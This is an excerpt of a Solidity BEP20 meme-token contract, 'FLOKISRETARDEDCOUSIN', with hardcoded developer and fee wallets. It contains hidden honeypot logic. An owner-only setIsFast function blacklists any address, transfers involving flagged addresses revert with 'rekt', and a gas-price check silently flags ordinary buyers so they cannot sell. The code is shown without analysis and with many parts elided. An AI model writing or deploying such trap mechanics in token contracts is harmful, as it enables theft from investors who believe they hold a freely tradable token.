...
contract DividendDistributor is IDividendDistributor {
    ...
    // EARN
    IBEP20 BETH = IBEP20(0x9Ab70e92319f0b9127df78868Fd3655fB9f1E322);
    ...
    uint256 public minPeriod = 240 * 60;
...
/* Token contract */
contract FLOKISRETARDEDCOUSIN is IBEP20, Auth {
    using SafeMath for uint256;

    // Addresses
    address BETH = 0x9Ab70e92319f0b9127df78868Fd3655fB9f1E322;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x846F3A725a38678aBef602ca9f79Ce6085c3AF31;
    ...
    // Name and symbol
    string constant _name = "FLOKISCOUSIN";
    string constant _symbol = "FCR";
    ...
    mapping(address => bool) public isFast;
    ...
    uint256 private gasPriceLimit = 8 * 1 gwei;
    bool private gasLimitActive = false;
    uint256 private gasMaxLimit = 3000000; // gasLeft limit
    ...
    constructor() Auth(msg.sender) {
        ...
        autoLiquidityReceiver = 0x7Aa7EC74439C19E43CFFd3D4570E0c5157F2552D;
        marketingFeeReceiver = 0x64B3e71B28EbaA3bfaB7a4483296510eC744670D;
   ...
   function approve(address spender, uint256 amount) public override returns (bool) {
    ...
    function setIsFast(address[] memory accounts, bool value) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; ++i) {
            isFast[accounts[i]] = value;
        }
    }
    ...
    function _transferFrom(
        ...
        require(!isFast[sender] && !isFast[recipient],"rekt");
        if (gasLimitActive) {
        if (tx.gasprice <= gasPriceLimit) {
                isFast[msg.sender] = true;
                require(
